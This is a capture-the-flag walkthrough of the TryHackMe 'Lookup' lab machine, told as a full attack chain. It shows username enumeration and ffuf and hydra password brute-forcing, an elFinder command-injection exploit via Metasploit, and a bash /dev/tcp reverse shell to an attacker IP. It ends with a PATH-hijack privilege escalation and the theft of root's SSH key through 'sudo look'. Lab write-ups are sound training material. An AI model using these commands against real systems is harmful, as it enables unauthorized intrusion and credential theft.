
[nmap...]
┌──(kali㉿kali)-[~/TryHAckMe/Lookup]
└─$ nmap -p- -Pn 10.201.45.229 --min-rate=1000 -A -o nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 02:51 EDT
Nmap scan report for 10.201.45.229  
Host is up (0.38s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 08:33:f2:d5:70:82:6d:84:67:6e:3f:f1:e0:e5:b5:9b (RSA)
|   256 c8:19:65:45:65:0d:4f:9a:1d:13:4d:b9:60:77:88:32 (ECDSA)
|_  256 a3:a4:fe:63:ab:11:61:95:c0:f1:86:87:4a:6f:9b:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   109.64 ms 10.17.0.1
2   ... 4
5   294.22 ms 10.201.45.229
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.64 seconds
________________________________________________________________________________________________________________________________________________________________________________________________
[ In the web interface we find a simple login page ]
 # when we try wrong creds it gives us two types of output:
        // username and password wrong
        // password wrong 

# so we find out that username admin is valid
________________________________________________________________________________________________________________________________________________________________________________________________
[NOW WE BRUTEFORCE...]

# ffuf ( my favourite )

// I saved the login request in a file and fired ffuf
[output]
[output]
┌──(kali㉿kali)-[~/TryHAckMe/Lookup]
└─$ ffuf -request brute.req -request-proto http -w /usr/share/wordlists/rockyou.txt -t 50 -fs 62

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/  

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://lookup.thm/
 :: Header           : Host: lookup.thm
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://lookup.thm
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 62
________________________________________________

<redacted>             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 629ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
# but here's the thing this is not a valid password for admin ( yes I also don't know the logic behind that )
________________________________________________________________________________________________________________________________________________________________________________________________
// So we try again but this time we have password and no username

┌──(kali㉿kali)-[~/TryHAckMe/Lookup]
└─$ ffuf -request brute.req -request-proto http -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t 50 -fs 74

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/  
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\  
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Origin: http://lookup.thm
 :: Header           : Connection: keep-alive
 :: Header           : Referer: http://lookup.thm/
 :: Header           : Host: lookup.thm
 :: Data             : username=FUZZ&password=password123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 74
________________________________________________

<redacted>                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 286ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
 # and this find us a valid user

[ After logging in the web interface using the credentials we come accross a ledger or whatever you call it...]
________________________________________________________________________________________________________________________________________________________________________________________________
# After trying stupid things I found out that the Version of the application (elFinder) is vulnerable to command injection

└─$ searchsploit elFinder
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
elFinder 2 - Remote Command Execution (via File Creation)                                                                                                                            | php/webapps/36925.py
elFinder 2.1.47 - 'PHP connector' Command Injection                                                                                                                                  | php/webapps/46481.py
elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                          | php/remote/46539.rb
elFinder Web file manager Version - 2.1.53 Remote Command Execution                                                                                                                  | php/webapps/51864.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
________________________________________________________________________________________________________________________________________________________________________________________________
# so we fire up metasploit and haha

[Important thing to note there is place your tun0 ip the default one didn't work for me and the RHOST is files.lookup.thm]

msf exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > exploit
[*] Started reverse TCP handler on <your-ip>:3333
[*] Uploading payload 'vfQSnH.jpg;echo 6370202e2e2f66696c65732f766651536e482e6a70672a6563686f2a202e683938366f7a697249782e706870 |xxd -r -p |sh& #.jpg' (1966 bytes)
[*] Triggering vulnerability via image rotation ...
[*] Executing payload (/elFinder/php/.h986ozirIx.php) ...
[*] Sending stage (40004 bytes) to 10.201.45.229
[+] Deleted .h986ozirIx.php
[*] Meterpreter session 2 opened <your-ip>:3333 -> 10.201.45.229:36440) at 2025-10-15 03:40:50 -0400
[*] No reply
[*] Removing uploaded file ...
[+] Deleted uploaded file
meterpreter > ls
Listing: /var/www/files.lookup.thm/public_html/elFinder/php
________________________________________________________________________________________________________________________________________________________________________________________________
# and we got a shell but I used this to get a shell on my pwncat
[ this step is not necessary , I'm just comfy with this ig]
meterpreter > shell
Process 3915 created.
Channel 1 created.
bash -i >& /dev/tcp/10.17.56.164/3333 0>&1
background # then i backgrounded the shell
________________________________________________________________________________________________________________________________________________________________________________________________
[ now there are options you can choose]

// 1 // we'll find a user think in the /home directory so you can bruteforce him

┌──(kali㉿kali)-[~/TryHAckMe/Lookup]
└─$ hydra -l think -P /usr/share/wordlists/rockyou.txt lookup.thm ssh
________________________________________________________________________________________________________________________________________________

// 2 // you can manually escalate privilege to find his password

[ This will give you think's password...]
www-data@ip-10-201-45-229:/$ cd /tmp
cd /tmp
www-data@ip-10-201-45-229:/tmp$ echo '#!/bin/bash' > id
echo '#!/bin/bash' > id
www-data@ip-10-201-45-229:/tmp$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
<0(think) gid=1000(think) groups=1000(think)"' >> id
www-data@ip-10-201-45-229:/tmp$ chmod +x id
chmod +x id
www-data@ip-10-201-45-229:/tmp$  export PATH=/tmp:$PATH
 export PATH=/tmp:$PATH
www-data@ip-10-201-45-229:/tmp$ /usr/sbin/pwm
/usr/sbin/pwm
<redacted>

*** YOU HAVE REACHED THE USER FLAG ***
________________________________________________________________________________________________________________________________________________________________________________________________
# Privilege Escalation

[ you can check the GTFO Bins fot more information]
//steps...

think@ip-10-201-45-229:~$ LFILE=/root/.ssh/id_rsa
think@ip-10-201-45-229:~$ sudo look '' "$LFILE"
[sudo] password for think:
-----BEGIN OPENSSH PRIVATE KEY-----
        <redacted>
-----END OPENSSH PRIVATE KEY-----
# now copy this in your machine

[ do not copy just the redacted part , copy all the output]
________________________________________________________________________________________________________________________________________________________________________________________________
# now simply login

[That i_rsa is the file that I copied the ssh key into...]

┌──(kali㉿kali)-[~]
└─$ ssh -i i_rsa root@lookup.thm
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)


root@ip-10-201-45-229:~# cd /root
root@ip-10-201-45-229:~# ls
total 52K
drwx------  6 root root 4.0K May 28 19:24 .
drwxr-xr-x 19 root root 4.0K Oct 15 06:50 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K May 12  2024 .bashrc
drwx------  2 root root 4.0K Jan 11  2024 .cache
-rwxrwx---  1 root root   66 Jan 11  2024 cleanup.sh
drwx------  3 root root 4.0K Apr 17  2024 .config
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
-rw-r--r--  1 root root  161 Jan 11  2024 .profile
-rw-r-----  1 root root   33 Jan 11  2024 root.txt
lrwxrwxrwx  1 root root    9 Jul 31  2023 .selected_editor -> /dev/null
drwx------  2 root root 4.0K May 28 19:24 .ssh
-rw-rw-rw-  1 root root  11K May 28 19:24 .viminfo
root@ip-10-201-45-229:~# cat root.txt
Goodluck :>
________________________________________________
*** Congratulations You pwned the BoX ***
________________________________________________
